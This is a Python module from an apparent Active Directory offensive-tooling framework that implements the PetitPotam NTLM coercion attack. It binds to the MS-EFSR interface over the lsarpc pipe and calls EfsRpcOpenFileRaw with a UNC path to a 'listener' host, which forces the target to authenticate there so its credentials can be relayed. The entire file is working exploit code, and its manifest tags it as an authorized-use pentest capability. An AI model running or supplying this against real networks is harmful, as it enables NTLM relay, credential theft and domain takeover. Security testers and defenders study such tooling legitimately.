"""PetitPotam — NTLM relay via EfsRpcOpenFileRaw (MS-EFSR)."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.petitpotam.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)

    if not listener:
        print("[!] --listener required (capture host for NTLM relay)", file=sys.stderr)
        return 1

    print(f"[*] PetitPotam: {target} → coerce to {listener}")

    try:
        from impacket.dcerpc.v5 import transport, epm
        from impacket.dcerpc.v5.ndr import NDRCALL
        from impacket import uuid
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    EFSR_UUID = uuid.uuidtup_to_bin(("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"))
    pipe = "\\lsarpc"

    try:
        string_binding = f"ncacn_np:{target}[{pipe}]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(EFSR_UUID)

        unc_path = f"\\\\{listener}\\share\\file"
        print(f"[*] Calling EfsRpcOpenFileRaw with UNC: {unc_path}")

        from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRPOINTER, NDRUNION
        import struct

        request = b""
        request += b"\x00\x00\x00\x00"
        request += struct.pack("<I", len(unc_path) + 1)
        request += struct.pack("<I", 0)
        request += struct.pack("<I", len(unc_path) + 1)
        request += unc_path.encode("utf-16-le") + b"\x00\x00"
        request += b"\x00\x00\x00\x00"

        dce.call(0, request)
        print(f"[+] PetitPotam coercion sent — check relay listener on {listener}")
        dce.disconnect()
        return 0

    except Exception as exc:
        error_str = str(exc)
        if "rpc_s_access_denied" in error_str.lower():
            print("[-] Access denied — unauthenticated coercion may be patched")
        else:
            print(f"[+] Coercion likely triggered (error expected): {error_str}")
        return 0
